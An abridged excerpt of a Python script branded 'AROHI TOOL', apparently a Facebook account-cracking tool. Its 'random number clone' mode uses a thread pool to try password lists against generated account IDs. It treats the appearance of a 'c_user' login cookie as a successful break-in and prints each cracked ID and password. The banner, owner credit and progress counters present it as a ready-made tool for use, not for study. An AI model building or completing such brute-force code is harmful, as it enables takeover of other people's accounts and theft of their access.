...
os.system('xdg-open https://www.facebook.com/profile.php?id=61557119633109')
...
░██▄▄▄▄██ ▒██▀▀█▄  ▒██   ██░░▓█ ░██ ░██░
 ...
 ▒▒   ▓▒█░░ ▒▓ ░▒▓░░ ▒░▒░▒░  ▒ ░░▒░▒░▓  
  ...
  ░   ▒     ░░   ░ ░ ░ ░ ▒   ░  ░░ ░ ▒ ░
      ...
      \x1b[37;41m\t𝕎𝔼𝔼𝕃ℂ𝔸𝕄𝔼 𝕋𝕆 𝔸ℝ𝕆ℍ𝕀 𝕋𝕆𝕆𝕃 \x1b[0;m\n\n\x1b[1;37m                          
\33[1;37m----------------------------------------------
\033[38;5;46m ᴏᴡɴᴇʀ •ᴀʀᴏʜɪ 
\033[38;5;46m ꜰᴀᴄᴇʙᴏᴏᴋ ᴀʀᴏʜɪ ᴄʜᴏᴡᴅʜᴜʏ 
\33[1;37m----------------------------------------------
""")                                              
...
class Main:
    ...
    def __init__(self):
        ...
        os.system('espeak -a 200 "Welcome , TO , AROHI , TOOL"')
        ...
        print(" [01] RANDOM  NUMBER CLONE \033[1;34m AROHI")
...
def num():
    ...
    with ThreadPool(max_workers=30) as noob:
        ...
        os.system('espeak -a 200 "Random , cloning , Started , AROHI"')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mAROHI❤️\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\033[38;5;46m[AROHI✔️] {uid} | {ps}")
        ...
        sys.stdout.write(f'\r\033[m[AROHI] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
